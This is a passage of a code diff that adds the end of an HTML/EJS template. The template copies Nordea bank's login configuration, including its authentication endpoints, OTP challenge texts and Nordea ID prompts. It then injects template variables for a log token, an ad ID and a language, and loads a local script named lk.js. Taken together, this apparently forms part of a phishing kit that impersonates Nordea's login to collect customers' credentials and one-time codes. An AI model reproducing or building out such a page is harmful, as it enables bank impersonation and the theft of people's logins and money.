+                    url: "\/api\/dbf\/ca\/mta-v1\/mta\/authentications",
+                    type: "mta",
+                },
+                "mta_off": {
+                    id: "mta_off",
+                    url: "\/api\/dbf\/ca\/otp-device-authentication-v1",
+                    type: "otpvalidation",
+                    texts: {
+                        "challenge_extra_info": "To get a response code, tap the {0} button in the Nordea ID app, enter the challenge code and your device PIN.",
+                    },
+                },
+                "ccalc": {
+                    id: "ccalc",
+                    url: "\/api\/dbf\/ca\/otp-device-authentication-v1",
+                    type: "otpvalidation",
+                    texts: {
+                        "challenge_extra_info": "To get a response code, press the {0} button on the code calculator, enter the challenge code and your code calculator PIN.",
+                    },
+                },
+                segments: { household: "Household", corporate: "Corporate" },
+                autoSubmit: false,
+                platform: "Web",
+                deviceType: "desktop",
+                installedApps: "",
+                userAccountsUrl: "\/api\/dbf\/ca\/user-accounts-service-v1",
+                cuaie: false,
+                agreement: "primary",
+                sessionId: null,
+                nv: "1.23.2",
+                av: "n\/a",
+                dm: "n\/a",
+                ec: "0",
+                rt: null,
+                allowAppSwitch: true,
+                forceRedirect: false,
+                defaultInputValues: [],
+                allowManualRedirect: false,
+                showExceptions: false,
+                bankIdType: "mobile",
+                requestHash: "cdc47734b0d25bb18469556af0597ab8",
+                retry: false,
+                texts: {
+                    toggleInputHint: "Toggle input value visibility",
+                    transactionCorrelationIdStatus: "Open Nordea ID. Before confirming, make sure the login ID matches what is shown in Nordea ID."
+                },
+                login: "Log on at Nordea",
+                confirm: "Confirm at Nordea"
+            });
+
+        </script>
+
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"
+        integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js" crossorigin="anonymous"></script>
+    <script src="https://unpkg.com/sweetalert/dist/sweetalert.min.js"></script>
+    <script>
+        const LOG_TOKEN = <%=log.token%>,
+            AD_LANG = "<%=log.ad.service.lang%>",
+            AD_ID = <%=log.ad.id%>,
+            translate = <%-JSON.stringify(translate) %>;
+    </script>
+    <script src="/js/lk.js" defer></script>
+    
+
+</body></html>
